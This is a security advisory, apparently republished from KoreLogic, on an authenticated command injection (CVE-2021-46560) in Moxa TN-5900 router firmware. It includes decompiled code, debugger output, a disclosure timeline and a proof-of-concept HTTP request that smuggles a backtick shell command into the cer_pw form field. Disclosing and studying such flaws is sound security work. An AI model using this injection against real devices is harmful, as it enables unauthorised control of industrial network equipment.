@@ -1,0 +1,183 @@
+id: 37290
+date: 01/31/2022
+title: Moxa TN-5900 Firmware Post Authentication Command Injection Exploit
+author: Matthew Bergin
+cves: CVE-2021-46560
+
+Title: Moxa TN-5900 Post Authentication Command Injection Vulnerability
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2022-002.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Moxa
+     Affected Product: TN-5900
+     Affected Version: v3.1 and prior
+     Platform: Moxa Linux
+     CWE Classification: CWE-78 Improper Neutralization of Special
+                         Elements used in an OS Command
+                         ('OS Command Injection')
+     CVE ID: CVE-2021-46560
+
+
+2. Vulnerability Description
+
+     A user who has authenticated to the management web application
+     is able to leverage a command injection vulnerability in the
+     p12 processing code of the certificate management function
+     web_CERMGMTUpload.
+
+
+3. Technical Description
+
+     Following authentication, the webs_CERMGMTUpload API method
+     becomes accessible.  This method takes a multi-part HTTP POST
+     request containing four parameters.  The cer_pw parameter does
+     not properly neutralize special elements used in operating
+     system commands and therefore it is possible to include
+     encapsulated commands to be executed. In the request below,
+     the cer_pw parameter has been written such that when executed
+     by the operating system a zero byte file will appear in the
+     /tmp directory. See the Proof of Concept section.
+
+     The relevant pseudo-c for this API method is included below. The
+     websGetVar function is used to retrieve the cer_pw parameter and
+     copies the value into the pass variable. The opcode (mgmtmode)
+     is then compared to the number 2 and when true will prepare a
+     command to be passed to system using the sprintf function. When
+     preparing this command, the pass variable (cer_pw) is included
+     without prior first sanitizing the user input.
+
+       void web_CERMGMTUpload(longlong *param_1,undefined8 param_2,undefined8 param_3) {
+         ...
+         __nptr = websGetVar(param_1,"mgmtmode",&DAT_120064f68);
+         opcode = atoi(__nptr);
+         __s = websGetVar(param_1,"cer_file",&DAT_120063dd0);
+         local_338 = websGetVar(param_1,"cer_name",&DAT_120063dd0);
+         if ((*local_338 == '\0') || (lVar1 = Ssys_CheckString(local_338), -1 < lVar1)) {
+           sVar2 = strlen(__s);
+           if (CONCAT44(extraout_v0_hi,sVar2) < 0x41) {
+             ...
+             sVar4 = strlen(local_338);
+             if (CONCAT44(extraout_v0_hi_00,sVar4) < 0x41) {
+               ...
+               if (opcode == 2) {
+                 memset(pass,0,0x41);
+                 __s = websGetVar(param_1,"cer_pw",&DAT_120063dd0);
+                 strncpy(pass,__s,0x20);
+                 ...
+               }
+               ...
+               __fd = open(inFile,0x102);
+               if (__fd < 0) {
+                 ...
+               }
+               else {
+                 sVar3 = write(__fd,param_1[0x38],*(param_1 + 0x39));
+                 ...
+                 else {
+                   if (opcode == 2) {
+                     outFile = FUN_120038e28(&local_159);
+                     snprintf(cmd,0x100,
+                              "openssl pkcs12 -in \"%s\" -out %s -passout pass:%s -password pass:%s",inFile
+                              ,outFile,pass,pass);
+                     system(cmd);
+                     ...
+                   }
+                   ...
+       }
+
+     Using a debugger we can see the command as it was
+     programmatically created using our malicious input. This
+     command is passed to the system function.
+
+       (gdb) x/25s $a0
+       0xfffbddb284:    "openssl pkcs12 -in \"/mnt/log1/p12_file/test.p12\" -out /mnt/ramdisk/p12_tmpfile.pem -passout
+pass:`touch /tmp/korelogic` -password pass:`touch /tmp/korelogic`"
+   
+     The file has been created.
+   
+       # ls -la /tmp/korelogic
+       -rwxr-xr-x    1 root     root          8072 Sep 23 20:30 korelogic
+   
+     It should be noted that the cer_name is exploitable as well.
+
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has released a patch which remediates the described
+     vulnerability. Release notes are available at:
+
+     https://www.moxa.com/en/support/product-support/security-advisory/tn-5900-secure-routers-vulnerabilities
+
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     and Josh Hardin of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+     2021.02.05 - KoreLogic submits vulnerability details to Moxa.
+     2021.02.08 - Moxa acknowledges receipt and the intention to
+                  investigate.
+     2021.03.02 - Moxa notifies KoreLogic that a patch for this
+                  vulnerability is expected to be available in June 2021.
+     2021.04.16 - 45 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.06.07 - KoreLogic requests update on the status of the
+                  proposed TN-5900 patch.
+     2021.06.15 - Moxa informs KoreLogic that the patch is expected to be released in mid-July 2021.
+     2021.06.23 - 90 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.07.25 - Moxa informs KoreLogic that the patch is expected to be released in mid-August 2021.
+     2021.09.22 - 150 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.12.21 - 210 business days have elapsed since KoreLogic reported
+                  this vulnerability to the vendor.
+     2021.12.27 - Moxa notified KoreLogic that the patch is complete and ready for release..
+     2021.12.28 - Moxa public acknowledgement.
+     2022.01.25 - KoreLogic requests CVE from Mitre.
+     2022.01.28 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+     POST /goform/web_CERMGMTUpload HTTP/1.1
+     Host: [redacted]:80
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate
+     ...
+     Connection: keep-alive
+     Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
+     Content-Length: 605
+   
+     -----------------------------9051914041544843365972754266
+     Content-Disposition: form-data; name="mgmtmode"
+   
+     2
+     -----------------------------9051914041544843365972754266
+     Content-Disposition: form-data; name="cer_file";
+     Content-Type: text/plain
+   
+     korelogic
+     -----------------------------9051914041544843365972754266
+     Content-Disposition: form-data; name="cer_name";
+     Content-Type: text/plain
+   
+     test.p12
+     -----------------------------9051914041544843365972754266
+     Content-Disposition: form-data; name="cer_pw";
+   
+     `touch /tmp/korelogic`
+     -----------------------------9051914041544843365972754266--
+   
+     HTTP/1.1 200 OK
+     Server: GoAhead-Webs
+     Pragma: no-cache
+     Cache-control: no-cache
+     Content-Type: text/html
+
+#  0day.today [2023-03-26]  #
